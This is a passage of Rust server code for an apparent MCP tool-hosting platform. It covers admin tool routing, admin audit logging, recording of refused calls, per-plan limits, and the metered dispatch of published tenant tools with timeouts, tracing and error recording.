            "admin.runs" => crate::runs::admin_runs(&self.state, &args).await,
            "admin.runs_reap" => crate::runs::admin_runs_reap(&self.state).await,
            "admin.triggers" => crate::triggers::admin_triggers(&self.state, &args).await,
            // PRD-mcphost-agent-directory P1 requirement 8.
            "admin.agent.lookup" => agents::admin_lookup(&self.state, &args).await,
            "admin.agent.handle_release" => agents::handle_release(&self.state, &args).await,
            // PRD-mcphost-agent-mesh-ops P0 requirements 1-5, P1 requirement 8.
            "admin.mesh.stats" => admin::mesh_stats(&self.state, &args).await,
            "admin.mesh.threads" => admin::mesh_threads(&self.state, &args).await,
            "admin.mesh.thread" => admin::mesh_thread(&self.state, &args).await,
            "admin.mesh.freeze" => admin::mesh_freeze(&self.state, &args).await,
            "admin.mesh.unfreeze" => admin::mesh_unfreeze(&self.state, &args).await,
            "admin.mesh.purge" => admin::mesh_purge(&self.state, &args).await,
            // PRD-mcphost-abuse-guard-ban-list requirement 3.
            "admin.ban.add" => admin::ban_add(&self.state, &args).await,
            "admin.ban.remove" => admin::ban_remove(&self.state, &args).await,
            "admin.ban.list" => admin::ban_list(&self.state, &args).await,
            // PRD-mcphost-oauth-resource-server P1 requirement 6, AC9.
            "admin.oauth.issuers" => crate::oauth::admin_issuers(&self.state).await,
            "admin.oauth.jwks_refresh" => crate::oauth::admin_jwks_refresh(&self.state, &args).await,
            "admin.oauth.issuer_remove" => crate::oauth::admin_issuer_remove(&self.state, &args).await,
            // PRD-mcphost-oauth-client-policy requirement 5 (AC7).
            "admin.oauth.client_block" => crate::oauth_policy::admin_client_block(&self.state, &args).await,
            "admin.oauth.client_unblock" => crate::oauth_policy::admin_client_unblock(&self.state, &args).await,
            "admin.oauth.blocked" => crate::oauth_policy::admin_blocked_list(&self.state).await,
            // PRD-mcphost-tool-scopes-and-consent requirement 6 (AC8) adds
            // consents_by_scope_7d onto this same tool rather than minting a
            // second admin.oauth.stats.
            "admin.oauth.stats" => {
                let mut stats = crate::oauth_policy::admin_stats(&self.state).await?;
                let consent_stats = crate::oauth::admin_stats(&self.state).await?;
                if let (Some(merged), Some(extra)) = (stats.as_object_mut(), consent_stats.as_object()) {
                    merged.extend(extra.clone());
                }
                Ok(stats)
            }
            "admin.oauth.demand_stats" => crate::oauth_stats::admin_stats(&self.state).await,
            "admin.oauth.trusted_issuers" => crate::oauth::admin_trusted_issuers(&self.state).await,
            // PRD-mcphost-alerting-webhook requirement 5.
            "admin.alerts.list" => admin::alerts_list(&self.state, &args).await,
            "admin.alerts.ack" => admin::alerts_ack(&self.state, &args).await,
            "admin.example_proposals" => admin::example_proposals(&self.state, &args).await,
            "admin.example_proof_report" => crate::example_proofs::report(&self.state, &args).await,
            "admin.alerts.raise" => admin::alerts_raise(&self.state, &args).await,
            // PRD-mcphost-status-feed requirement 4/8.
            "admin.incident.open" => admin::incident_open(&self.state, &args).await,
            "admin.incident.update" => admin::incident_update(&self.state, &args).await,
            "admin.incident.close" => admin::incident_close(&self.state, &args).await,
            "admin.status.sample" => admin::status_sample(&self.state, &args).await,
            "admin.status.rollup" => admin::status_rollup(&self.state, &args).await,
            // PRD-mcphost-feedback-themes-nightly R4.
            "admin.feedback.themes" => admin::feedback_themes(&self.state, &args).await,
            // PRD-mcphost-upstream-token-vault-status P0 requirement 2 (AC4/AC5).
            "admin.vault.stats" => admin::vault_stats(&self.state).await,
            // PRD-mcphost-end-user-audit-and-revoke P1 requirement 7 (AC9).
            "admin.enduser.stats" => admin::enduser_stats(&self.state).await,
            // PRD-mcphost-activation-funnel requirements 3, 6.
            "admin.funnel" => admin::funnel(&self.state, &args).await,
            // PRD-mcphost-upgrade-moment requirement 6 (AC7).
            "admin.upgrades" => admin::upgrades(&self.state, &args).await,
            other => Err(AppError::ToolNotFound(other.to_string())),
        };

        // PRD-mcphost-provenance-audit requirement 4: every admin-bearer
        // mutation appends to `admin_audit` from this one central point,
        // rather than each admin::* fn writing its own row -- the same
        // "one contract, many callers" reasoning `state::derive_origin`
        // follows for write-time origin.
        if let Ok(value) = &result
            && let Some((action, target, detail)) = admin::admin_audit_entry(name, &args, value)
        {
            let actor_key_id = self
                .state
                .admin_key
                .as_deref()
                .map(crate::auth::hash_key)
                .unwrap_or_default();
            if let Err(e) = self
                .state
                .db
                .record_admin_audit(actor_key_id, action, target, detail)
                .await
            {
                tracing::warn!(error = %e, tool = name, "failed to record admin_audit row");
            }
        }
        result
    }

    /// PRD-mcphost-refused-calls-write-ledger-row requirement 3: record one
    /// `calls` row for a call refused before dispatch, then hand `err` back
    /// unchanged so the wire response is untouched. A failed row write is
    /// logged, never surfaced (AC6) -- unlike the success path's AC14
    /// contract, a refusal has nothing to under-meter.
    #[allow(clippy::too_many_arguments)]
    async fn refuse(
        &self,
        tenant: &Tenant,
        caller: Option<&Tenant>,
        tool: &str,
        err: AppError,
        started: Instant,
        auth_method: &str,
    ) -> AppError {
        let duration_ms = started.elapsed().as_millis() as i64;
        // A `quota_exceeded` refusal is recorded under the plan knob it
        // tripped (`calls_per_day`) -- the wire code alone would make every
        // quota family read the same; every other refusal keeps its wire code.
        let code = match &err {
            AppError::Structured { code: crate::errors::QUOTA_EXCEEDED, data, .. } => data
                .pointer("/limit/name")
                .and_then(Value::as_str)
                .unwrap_or("quota_exceeded")
                .to_string(),
            other => other.code().to_string(),
        };
        let summary = crate::doctor::error_summary_of(&err);
        if let Err(e) = self
            .state
            .db
            .record_refused_call(
                tenant.id,
                tool.to_string(),
                code.clone(),
                duration_ms,
                tenant.origin.clone(),
                tenant.origin_detail.clone(),
                caller.map(|c| c.id),
                auth_method.to_string(),
                Some(summary),
            )
            .await
        {
            tracing::warn!(
                error = %e, tenant = %tenant.namespace, tool, error_code = %code,
                "failed to record refused call"
            );
        }
        err
    }

    /// PRD-mcphost-call-limits-honest requirement 1: the deadline this
    /// call's spec actually asks for (a kind-specific override, already
    /// bounded by that kind's own maximum -- see
    /// [`Kind::requested_timeout`]), or `AppState::call_timeout`'s default
    /// when the spec declares none. Every real dispatch site below resolves
    /// through this rather than reaching for `self.state.call_timeout`
    /// directly, so `CALL_TIMEOUT` is a default a spec can override, never a
    /// silent ceiling under it.
    fn resolve_call_timeout(&self, kind: &Arc<dyn Kind>, spec: &Value) -> Duration {
        kind.requested_timeout(spec)
            .unwrap_or(self.state.call_timeout)
    }

    /// PRD-mcphost-call-limits-honest requirement 3: `tenant`'s own
    /// concurrent-call admission cap, read from its plan -- `usize::MAX`
    /// (no per-tenant limiting) if the tenant's plan has somehow fallen out
    /// of the loaded catalog (should never happen; the same degrade
    /// `control::quickstart`'s own plan lookup already uses).
    fn chain_fanout_cap(&self, tenant: &Tenant) -> usize {
        self.state
            .plans
            .get(&tenant.plan)
            .map(|plan| plan.chain_fanout_max.max(0) as usize)
            .unwrap_or(usize::MAX)
    }

    fn concurrent_calls_cap(&self, tenant: &Tenant) -> usize {
        self.state
            .plans
            .get(&tenant.plan)
            .map(|plan| plan.concurrent_calls_per_tenant.max(0) as usize)
            .unwrap_or(usize::MAX)
    }

    /// PRD-mcphost-sandbox-channel-msg-bridge requirement 5: `tenant`'s
    /// `state_ops_per_call_max`, read from its plan -- the shared budget
    /// `kinds::python`'s `ChannelSidecarBridge`/`MsgSidecarBridge` check
    /// `CallCtx.sidecar_ops` against. `i64::MAX` (no cap) if the tenant's
    /// plan has somehow fallen out of the loaded catalog, same degrade
    /// [`Self::concurrent_calls_cap`] above uses.
    fn sidecar_ops_cap(&self, tenant: &Tenant) -> i64 {
        self.state
            .plans
            .get(&tenant.plan)
            .map(|plan| plan.state_ops_per_call_max)
            .unwrap_or(i64::MAX)
    }

    /// Execute a published tenant tool (`<namespace>.<local-name>`),
    /// metering the call and enforcing its resolved deadline (requirement
    /// 1: the spec's own `timeout_s` when it declared one, else
    /// `AppState::call_timeout`'s default).
    ///
    /// `tenant` is always the tool's OWNER -- whose sandbox and secrets run
    /// it, and whose per-tool concurrency cap applies (PRD-mcphost-sharing
    /// requirement 2). `caller` is `None` for an ordinary same-tenant call
    /// (`tenant` is also the caller) and `Some(&caller_tenant)` for a
    /// cross-tenant call reached via `call_shared_tool` -- requirement 4:
    /// the CALLER's `calls_per_day` is what's checked and metered, not the
    /// owner's, and requirement 3: the `calls` row's `caller_tenant_id`
    /// carries the attribution.
    // Six parameters: one dispatch path with a single call site per caller
    // shape (same-tenant vs. cross-tenant); splitting it would just move
    // the same inputs into a struct with one constructor per call site.
    #[allow(clippy::too_many_arguments)]
    #[allow(clippy::too_many_arguments)]
    async fn call_published_tool(
        &self,
        tenant: &Tenant,
        local_name: &str,
        args: Value,
        mcp_name_mismatch: bool,
        caller: Option<&Tenant>,
        version: Option<i64>,
        end_user: Option<&crate::enduser::EndUser>,
        // PRD-mcphost-oauth-demand-signal requirement 1 (AC1): `"key"`,
        // `"issuer_jwt"`, or `"hosted_token"` -- resolved once by every
        // caller from the same `Auth`/`OauthCaller` `end_user` above was
        // already resolved from, so this row's own `calls.auth_method`
        // never has to re-derive it.
        auth_method: &str,
        token_scope: Option<&str>,
    ) -> Result<Value, AppError> {
        let started = Instant::now();
        // PRD-mcphost-call-cost-estimate: resolution (tool row, scope,
        // pinned version, kind) then every `PREFLIGHT_CHECKS` row of the
        // `Resolved` stage -- the same list the dry run runs, so the two
        // cannot disagree. `host_tool_call` ran the `PreResolve` row
        // (budget ceiling) before getting here.
        let settle = |refusal: crate::preflight::Refusal| async move {
            if refusal.records() {
                self.refuse(tenant, caller, local_name, refusal.err, started, auth_method).await
            } else {
                refusal.err
            }
        };
        let target =
            match crate::preflight::resolve(&self.state, tenant, local_name, version, token_scope).await {
                Ok(target) => target,
                Err(refusal) => return Err(settle(refusal).await),
            };
        let preflight_ctx = crate::preflight::Ctx {
            state: &self.state,
            mode: crate::preflight::Mode::Real,
            owner: tenant,
            caller,
            tool: local_name,
            args: &args,
            budget: None,
            target: Some(&target),
        };
        if let Err(refusal) = crate::preflight::run_stage(&preflight_ctx, crate::preflight::Stage::Resolved).await {
            return Err(settle(refusal).await);
        }
        let crate::preflight::Target { row, spec, kind, .. } = target;

        // PRD-mcphost-upstream-token-vault requirement 4 / AC6: resolved
        // (and, if it's within 120s of expiry, refreshed) BEFORE any of
        // this call's secrets/log/resources are even built -- a caller with
        // no connected token for a declared `upstream_provider` never
        // reaches `kind.call` at all, so no outbound request is ever made.
        let vault_token = match kind.declared_upstream_provider(&spec) {
            Some(provider) => Some(crate::vault::resolve_for_call(&self.state, tenant, &provider, end_user).await?),
            None => None,
        };

        let secret_map = build_secret_map(&self.state, tenant.id).await?;
        let secrets = secret_resolver_for(&self.state, tenant.id, secret_map.clone()).await?;
        let log = Arc::new(BufferedLog(std::sync::Mutex::new(Vec::new())));
        let resources = Arc::new(CellResourceSink::new());
        // PRD-mcphost-chain-host-steps P1 requirement 6 (AC6): see
        // `TenantHostStepBridge::step_tool`'s own doc comment.
        let step_tool_cell: Arc<std::sync::Mutex<Option<String>>> = Arc::new(std::sync::Mutex::new(None));
        let resolved_timeout = self.resolve_call_timeout(&kind, &spec);
        // PRD-mcphost-chain-run-lineage requirement 4 (open question 1:
        // "always, so lineage is uniform"): generated BEFORE dispatch
        // (unlike before this PRD, where `record_call_attributed_with_end_user`
        // minted this call's own run id only after the call returned) so a
        // composing `Kind` (`chain`) can set every child run row it writes
        // DURING the call as `parent_run_id`-ing this id -- the row itself
        // is still only inserted below, once the outcome is known.
        let run_id = crate::state::new_ulid();
        let ctx = CallCtx {
            tenant_id: tenant.id,
            namespace: tenant.namespace.clone(),
            secrets,
            deadline: Instant::now() + resolved_timeout,
            log: log.clone() as Arc<dyn CallLog>,
            test_mode: false,
            resources: resources.clone() as Arc<dyn ResourceSink>,
            tool_name: Some(local_name.to_string()),
            // requirement 5: a real call's state writes get one
            // `CallLog` line each (flushed into `host.tool_logs` below,
            // same as every other line this call's `Kind` logs); it
            // carries no `state` tally in its own return value -- that's
            // `host.tool_test`/`host.tool_run`-only (see those methods).
            state: Arc::new(CountingStateBackend::new(
                Arc::new(TenantStateBridge {
                    state: self.state.clone(),
                    tenant: tenant.clone(),
                    end_user: end_user.cloned(),
                    dry_run: None,
                }),
                Some(log.clone() as Arc<dyn CallLog>),
            )),
            table: Arc::new(TenantTableBridge {
                state: self.state.clone(),
                tenant: tenant.clone(),
                dry_run: None,
                end_user: end_user.cloned(),
            }),
            docs: Arc::new(TenantDocsBridge {
                state: self.state.clone(),
                tenant: tenant.clone(),
                end_user: end_user.cloned(),
            }),
            lineage: Arc::new(TenantLineageBridge {
                state: self.state.clone(),
                tenant: tenant.clone(),
            }),
            drift: Arc::new(TenantDriftBridge {
                state: self.state.clone(),
                tenant: tenant.clone(),
            }),
            // PRD-mcphost-sandbox-channel-msg-bridge requirement 2: same
            // "real tenant backend on the real dispatch path" convention
            // `state`/`table`/`docs`/`lineage` above already use.
            channel: Arc::new(TenantChannelBridge {
                state: self.state.clone(),
                tenant: tenant.clone(),
            }),
            msg: Arc::new(TenantMsgBridge {
                state: self.state.clone(),
                tenant: tenant.clone(),
            }),
            // PRD-mcphost-elicitation-with-ask-fallback: one per call, so the
            // 3-elicit cap is per call; the client channel is the one
            // `call_tool` set around this dispatch (none for a job).
            elicit: Arc::new(crate::elicit::TenantElicit::new(
                self.state.clone(),
                tenant.clone(),
                crate::elicit::current_channel(),
            )),
            // PRD-mcphost-sampling-from-tools: the client `call_tool` set
            // around this dispatch (none for a job: `no_client`).
            sampling: Arc::new(crate::sampling::TenantSampling::new(
                self.state.clone(),
                tenant.clone(),
                crate::sampling::current_client(),
                log.clone() as Arc<dyn CallLog>,
            )),
            sidecar_ops: Arc::new(std::sync::atomic::AtomicI64::new(0)),
            sidecar_ops_max: self.sidecar_ops_cap(tenant),
            // PRD-mcphost-composition requirement 1/2: every real
            // `tools/call`/`host.tool_call` dispatch is the root of its own
            // composition tree -- depth 0, a fresh per-tree children
            // counter, and the tenant table/kind registry a composing
            // `Kind` (`chain`) needs to dispatch its own children through
            // `kinds::compose_call`.
            compose_depth: 0,
            compose_children: Some(Arc::new(std::sync::atomic::AtomicU32::new(0))),
            compose_db: Some(self.state.db.clone()),
            compose_kinds: Some(self.state.kinds.clone()),
            concurrent_calls_per_tenant: self.concurrent_calls_cap(tenant),
            chain_fanout_max: self.chain_fanout_cap(tenant),
            // PRD-mcphost-sandbox-egress-allowlist requirement 1/2/3: resolved
            // from the tenant's plan here, once, same convention as
            // `concurrent_calls_per_tenant` just above.
            egress_allowed: tenant.plan == "pro",
            sandbox_ceilings: self.state.plans.sandbox_ceilings(&tenant.plan),
            // PRD-mcphost-runs-and-jobs: an ordinary synchronous dispatch is
            // never a job -- no run id to report progress against, no pid
            // slot `host.runs.cancel` would ever look up.
            run_id: None,
            progress: crate::progress::current_sink(),
            cancel_pid: Arc::new(crate::runs::CancelSlot::default()),
            end_user: end_user.cloned(),
            vault_token,
            // PRD-mcphost-chain-host-steps requirement 1/3: every real
            // `tools/call`/`host.tool_call` dispatch can reach an
            // allowlisted `host.*` verb through this call's own
            // `dispatch_tenant_tool`, same "root of its own composition
            // tree" reasoning as `compose_depth`/`compose_db` above -- a
            // `chain` tool's step dispatch is the first (and, today, only)
            // `Kind` that ever consults this.
            host_dispatch: Some(Arc::new(TenantHostStepBridge {
                handler: self.clone(),
                tenant: tenant.clone(),
                end_user: end_user.cloned(),
                calls_auth_method: auth_method.to_string(),
                step_tool: step_tool_cell.clone(),
            })),
            parent_run_id: Some(run_id.clone()),
            // PRD-mcphost-run-budget-governor requirement 4: budget
            // enforcement is only wired into the run executor's own job
            // dispatch (`runs::execute_job`) -- an ordinary synchronous call
            // carries no ledger to check or record against.
            budget: None,
            prev_result: None,
        };
        // requirement 4 (AC1/AC2): the three `calls` columns every branch
        // below's `record_call_attributed_with_end_user` writes.
        let end_user_subject = end_user.map(|e| e.subject.clone());
        let end_user_issuer = end_user.and_then(|e| e.issuer.clone());
        let end_user_method = end_user.map(|e| e.method.as_str().to_string());
        // PRD-mcphost-shared-call-run-scope requirement 1: `Some(tenant's
        // namespace)` only for a cross-tenant call (`caller.is_some()`) --
        // tells `record_call_attributed_with_end_user` to scope this call's
        // `runs` row to `caller`, not `tenant` (the owner).
        let shared_owner_namespace = caller.map(|_| tenant.namespace.clone());

        let start = Instant::now();
        if mcp_name_mismatch {
            tracing::warn!(tenant = %tenant.namespace, tool = %local_name, "Mcp-Name header does not match call body's tool name");
        }
        // PRD-mcphost-call-trace-replay: the request as received (cloned
        // before the call consumes it) and the capture the kind fills in.
        let trace_on = crate::calltrace::enabled();
        let capture = trace_on.then(crate::calltrace::new_capture);
        let trace_args = trace_on.then(|| args.clone());
        let call = tokio::time::timeout(resolved_timeout, kind.call(&spec, args, &ctx));
        // PRD-mcphost-graceful-drain-contract R1/R3: counted while it runs;
        // when the drain bound expires first, the call is dropped and
        // answered `interrupted`.
        let drain = crate::drain::global();
        let _in_flight = drain.enter();
        let call = async {
            tokio::select! {
                o = call => Some(o),
                _ = drain.cancelled() => None,
            }
        };
        let outcome = match &capture {
            Some(cap) => crate::calltrace::scope(cap.clone(), call).await,
            None => call.await,
        };
        let duration_ms = start.elapsed().as_millis() as i64;
        let Some(outcome) = outcome else {
            drain.note_interrupted();
            let app_err = AppError::Structured {
                code: INTERRUPTED,
                message: "the server restarted before this call finished; retry it".to_string(),
                data: json!({
                    "restart_id": drain.restart_id(),
                    "drained_ms": drain.info().map(|i| i.at.elapsed().as_millis() as i64),
                }),
            };
            let (cpu_ms, peak_rss_kb) = resources.0.lock().map(|g| *g).unwrap_or_default().unzip();
            let step_tool = step_tool_cell.lock().ok().and_then(|g| g.clone());
            if let Ok(call_id) = self
                .state
                .db
                .record_call_traced(
                    tenant.id,
                    local_name.to_string(),
                    duration_ms,
                    false,
                    Some(call_error_class(&app_err).to_string()),
                    cpu_ms,
                    peak_rss_kb,
                    "error",
                    tenant.origin.clone(),
                    tenant.origin_detail.clone(),
                    caller.map(|c| c.id),
                    end_user_subject.clone(),
                    end_user_issuer.clone(),
                    end_user_method.clone(),
                    shared_owner_namespace.clone(),
                    auth_method.to_string(),
                    Some(run_id.clone()),
                    step_tool,
                    None,
                    Some(crate::doctor::error_summary_of(&app_err)),
                )
                .await
            {
                crate::calltrace::publish_call_id(call_id);
            }
            tracing::info!(
                tenant = %tenant.namespace, method = "tools/call", tool = %local_name,
                duration_ms, status = "error", error_class = "interrupted", mcp_name_mismatch,
            );
            return Err(app_err.with_tool(local_name));
        };
        // Built once, moved into whichever branch below writes the `calls`
        // row, so the trace commits in that row's own transaction.
        let trace = trace_args.map(|trace_args| {
            let error = match &outcome {
                Ok(Err(kind_err)) => Some(crate::calltrace::kind_error_info(kind_err)),
                Err(_) => Some(json!({"code": "call_timeout"})),
                Ok(Ok(_)) => None,
            };
            let mut trace =
                crate::calltrace::build_trace(&secret_map, local_name, &trace_args, capture.as_ref(), error);
            crate::calltrace::attach_limits(&mut trace, resources.limits_json());
            trace
        });
        let (cpu_ms, peak_rss_kb) = resources.0.lock().map(|g| *g).unwrap_or_default().unzip();
        // requirement 6 (AC6): whichever host step (if any) this call's own
        // `TenantHostStepBridge` dispatched, read back after `kind.call`
        // returns so every branch below's `calls` row carries it.
        let step_tool = step_tool_cell.lock().ok().and_then(|g| g.clone());

        // PRD-mcphost-sharing requirement 3: "host.tool_logs on the owner
        // side shows the caller namespace" -- one line per cross-tenant
        // call, carrying only the caller's namespace, never its arguments
        // (which never reach this buffer in the first place).
        if let Some(caller) = caller
            && let Ok(mut lines) = log.0.lock()
        {
            lines.push(format!("caller={}", caller.namespace));
        }

        for line in log.0.lock().map(|g| g.clone()).unwrap_or_default() {
            let _ = self
                .state
                .db
                .append_log(tenant.id, local_name.to_string(), line)
                .await;
        }

        match outcome {
            Ok(Ok(value)) => {
                // PRD-mcphost-first-call-reliability requirement 6 (P1,
                // AC6): a call that waited (bounded) for a building
                // environment, or came back past the bound as the
                // structured `building` result, is metered distinctly from
                // an ordinary `ok` -- so billing/measure can tell readiness
                // cost apart from real work. `building` is read straight
                // off the result shape `building_result` builds; `waited`
                // is read off the `waited_ms=` call-record line
                // `resolve_env_readiness`'s callers log only when they
                // actually waited (waited_ms > 0).
                let call_outcome = if value.get("status").and_then(Value::as_str)
                    == Some("building")
                {
                    "building"
                } else if log
                    .0
                    .lock()
                    .map(|g| g.iter().any(|l| l.starts_with("waited_ms=")))
                    .unwrap_or(false)
                {
                    "waited"
                } else {
                    "ok"
                };

                // Requirement 8: every `tools/call` writes a `calls` row.
                // If that write fails (AC14: an unwritable database), the
                // call must not silently succeed with unmetered usage —
                // report the storage failure even though the `Kind::call`
                // itself completed.
                match self
                    .state
                    .db
                    .record_call_traced(
                        tenant.id,
                        local_name.to_string(),
                        duration_ms,
                        true,
                        None,
                        cpu_ms,
                        peak_rss_kb,
                        call_outcome,
                        tenant.origin.clone(),
                        tenant.origin_detail.clone(),
                        caller.map(|c| c.id),
                        end_user_subject.clone(),
                        end_user_issuer.clone(),
                        end_user_method.clone(),
                        shared_owner_namespace.clone(),
                        auth_method.to_string(),
                        Some(run_id.clone()),
                        step_tool.clone(),
                        trace,
                        None,
                    )
                    .await
                {
                    Ok(call_id) => crate::calltrace::publish_call_id(call_id),
                    Err(storage_err) => {
                        tracing::error!(
                            tenant = %tenant.namespace, method = "tools/call", tool = %local_name,
                            duration_ms, status = "error", error_class = "storage", mcp_name_mismatch,
                        );
                        return Err(storage_err);
                    }
                }
                // PRD-mcphost-end-user-audit-and-revoke requirement 1: this
                // identified call's activity, buffered for the next 10s
                // flush rather than written to `end_users` here.
                if let Some(subject) = &end_user_subject {
                    self.state.end_user_activity.record(tenant.id, subject, end_user_issuer.clone());
                }
                tracing::info!(
                    tenant = %tenant.namespace, method = "tools/call", tool = %local_name,
                    duration_ms, status = "ok", outcome = call_outcome, mcp_name_mismatch,
                );
                // PRD-mcphost-activation-funnel requirement 2 (AC2): only a
                // same-tenant call (`caller: None`) counts as "a call to a
                // tool this tenant owns" -- a cross-tenant shared-tool call
                // (`caller: Some(_)`) stamps neither the owner's nor the
                // caller's `first_own_call_unix`.
                if caller.is_none()
                    && tenant.first_own_call_unix.is_none()
                    && let Err(e) = self.state.db.touch_first_own_call(tenant.id, now_unix()).await
                {
                    tracing::warn!(error = %e, tenant = %tenant.namespace, "failed to bump first_own_call_unix");
                }
                // PRD-mcphost-tool-versions requirement 6 (AC7): an
                // unpinned sharer's result carries `version_changed` once,
                // the call after a real change on the owner's side --
                // `row.current_version` is what actually ran (this branch
                // never reaches here for a pinned call's own version drift,
                // since `version.is_none()` guards it), scoped to
                // cross-tenant calls only (`caller.is_some()`) per the
                // requirement's own "a shared tool's unpinned caller"
                // wording.
                let mut value = value;
                // PRD-mcphost-sandbox-resource-limits-from-plan R4: a python
                // result reports what the call used, beside the plan
                // ceilings `host.quickstart` publishes.
                if kind.name() == "python"
                    && let Some(used) = resources.resources_used(duration_ms)
                    && let Some(obj) = value.as_object_mut()
                {
                    crate::envelope::stamp_resources_used(obj, used);
                }
                if version.is_none()
                    && let Some(caller) = caller
                    && let Ok(Some(prev)) = self
                        .state
                        .db
                        .check_version_watermark(
                            tenant.id,
                            local_name.to_string(),
                            caller.id,
                            row.current_version,
                        )
                        .await
                    && let Some(obj) = value.as_object_mut()
                {
                    obj.insert(
                        "version_changed".to_string(),
                        json!({"from": prev, "to": row.current_version}),
                    );
                }
                Ok(value)
            }
            Ok(Err(kind_err)) => {
                let mut app_err = AppError::from(kind_err);
                // PRD-mcphost-call-concurrency-visible R2/R3: the tenant-scope
                // refusal names the plan whose ceiling it hit, and is recorded
                // as `error_class = "concurrency"` (the host-scope `capacity`
                // keeps its own code).
                if let AppError::Structured { code: CONCURRENCY_EXCEEDED, data: Value::Object(data), .. } = &mut app_err {
                    data.insert("plan".to_string(), json!(tenant.plan));
                }
                let recorded_error_class = call_error_class(&app_err);
                // PRD-mcphost-sandbox-egress-allowlist requirement 4 (AC7):
                // a call refused for `network`'s sake counts toward admin
                // healthz's `network_denied` -- `run_plan` (AC6: an
                // existing public/egress tool, now non-pro) and
                // `run_no_proxy` (AC3: a pro tenant with no
                // `$MCPHOST_EGRESS_PROXY`) are the two codes
                // `kinds::python::PythonKind::network_mode` raises.
                match app_err.code() {
                    // PRD-mcphost-secret-non-exfiltration-proof R5: one
                    // `admin.audit_log` row per block (the self-test's own
                    // fixture calls are expected blocks, not offences).
                    "secret_leak_blocked" if !local_name.starts_with(crate::leakguard::FIXTURE_PREFIX) => {
                        if let AppError::Structured { data, .. } = &app_err {
                            crate::leakguard::record_block(&self.state.db, &tenant.namespace, local_name, data).await;
                        }
                    }
                    "plan_required" => {
                        let _ = self.state.db.record_network_denial("run_plan", Some(tenant.id)).await;
                    }
                    "egress_unavailable" => {
                        let _ = self.state.db.record_network_denial("run_no_proxy", Some(tenant.id)).await;
                    }
                    _ => {}
                }
                if let Ok(call_id) = self
                    .state
                    .db
                    .record_call_traced(
                        tenant.id,
                        local_name.to_string(),
                        duration_ms,
                        false,
                        Some(recorded_error_class.to_string()),
                        cpu_ms,
                        peak_rss_kb,
                        "error",
                        tenant.origin.clone(),
                        tenant.origin_detail.clone(),
                        caller.map(|c| c.id),
                        end_user_subject.clone(),
                        end_user_issuer.clone(),
                        end_user_method.clone(),
                        shared_owner_namespace.clone(),
                        auth_method.to_string(),
                        Some(run_id.clone()),
                        step_tool.clone(),
                        trace,
                        Some(crate::doctor::error_summary_of(&app_err)),
                    )
                    .await
                {
                    crate::calltrace::publish_call_id(call_id);
                }
                if let Some(subject) = &end_user_subject {
                    self.state.end_user_activity.record(tenant.id, subject, end_user_issuer.clone());
                }
                tracing::info!(
                    tenant = %tenant.namespace, method = "tools/call", tool = %local_name,
                    duration_ms, status = "error", error_class = app_err.code(), mcp_name_mismatch,
                );
                Err(app_err.with_tool(local_name))
            }
            Err(_elapsed) => {
                if let Ok(call_id) = self
                    .state
                    .db
                    .record_call_traced(
                        tenant.id,
                        local_name.to_string(),
                        duration_ms,
                        false,
                        Some("call_timeout".to_string()),
                        cpu_ms,
                        peak_rss_kb,
                        "timeout",
                        tenant.origin.clone(),
                        tenant.origin_detail.clone(),
                        caller.map(|c| c.id),
                        end_user_subject.clone(),
                        end_user_issuer.clone(),
                        end_user_method.clone(),
                        shared_owner_namespace.clone(),
                        auth_method.to_string(),
                        Some(run_id.clone()),
                        step_tool.clone(),
                        trace,
                        Some(crate::doctor::error_summary_of(&AppError::CallTimeout(resolved_timeout.as_secs()))),
                    )
                    .await
                {
                    crate::calltrace::publish_call_id(call_id);
                }
                if let Some(subject) = &end_user_subject {
                    self.state.end_user_activity.record(tenant.id, subject, end_user_issuer.clone());
                }
                tracing::info!(
                    tenant = %tenant.namespace, method = "tools/call", tool = %local_name,
                    duration_ms, status = "error", error_class = "call_timeout", mcp_name_mismatch,
                );
                Err(AppError::CallTimeout(resolved_timeout.as_secs()))
            }
        }
    }

    /// `host.tool_test` (P1 requirement 9, AC12): the same real call as
    /// `call_published_tool`, minus the `calls` row (the resolved open
    /// question in the PRD is decided here: a test call DOES count toward
    /// the outbound rate limit, since it hits the real upstream and
    /// consumes the same quota) and minus persisted `logs` lines (this is
    /// an out-of-band debug call, not part of the tool's operational
    /// history). `ctx.test_mode = true` tells a `Kind` that supports it
    /// (`http`) to echo the rendered request, secrets redacted, alongside
    /// the response.
    async fn tool_test(&self, tenant: &Tenant, args: Value) -> Result<Value, AppError> {
        let local_name = args
            .get("name")
            .and_then(Value::as_str)
            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'name'".into()))?
            .to_string();
        // PRD-mcphost-tool-test-examples-from-schema R3: `args` omitted (or
        // null) means "run the example generated from this tool's schema".
        let args_given = args.get("args").is_some_and(|v| !v.is_null());
        let mut call_args = args
            .get("args")
            .filter(|v| !v.is_null())
            .cloned()
            .unwrap_or_else(|| Value::Object(Default::default()));

        // PRD-mcphost-tool-call-host-verb-forward requirement 3 (AC5):
        // `name` already failed to resolve to a published tool -- the exact
        // same "tenant tool wins, forward only on a miss" precedence
        // `host_tool_call` uses, applied here since a tenant could in
        // principle publish a tool literally named like a verb and still
        // expect `host.tool_test` to dry-run THAT tool, not the verb.
        let row: Option<ToolRow> = self.state.db.get_tool(tenant.id, local_name.clone()).await?;
        let row: ToolRow = match row {
            Some(row) => row,
            None => {
                return match crate::verbforward::resolve(&local_name, &self.state.kinds) {
                    Some(canonical) if crate::verbforward::is_denylisted(&canonical) => {
                        Err(AppError::host_verb_not_forwarded(&canonical, &call_args))
                    }
                    Some(canonical) => self.test_forward_host_verb(tenant, &canonical, call_args).await,
                    None => Err(AppError::ToolNotFound(local_name)),
                };
            }
        };
        let kind: Arc<dyn Kind> = self.state.kinds.get(&row.kind).ok_or_else(|| {
            AppError::Internal(format!(
                "published tool names unregistered kind '{}'",
                row.kind
            ))
        })?;

        // PRD-mcphost-chain-dry-run R1: `fixtures` is a chain-only argument.
        let fixtures: Option<serde_json::Map<String, Value>> = match args.get("fixtures") {
            None | Some(Value::Null) => None,
            Some(Value::Object(m)) => Some(m.clone()),
            Some(_) => {
                return Err(AppError::InvalidArgs(
                    "'fixtures' must be an object mapping a step number or tool name to its recorded result".into(),
                ));
            }
        };
        if let Some(f) = &fixtures {
            if kind.name() != "chain" {
                return Err(AppError::Structured {
                    code: FIXTURES_NOT_APPLICABLE,
                    message: format!(
                        "'{local_name}' is a {} tool; fixtures apply to chain tools only",
                        kind.name()
                    ),
                    data: json!({"kind": kind.name(), "applies_to": ["chain"]}),
                });
            }
            let total: usize = f.iter().map(|(k, v)| k.len() + v.to_string().len()).sum();
            if total > crate::runs::RUN_PART_BYTES {
                return Err(AppError::Structured {
                    code: FIXTURES_TOO_LARGE,
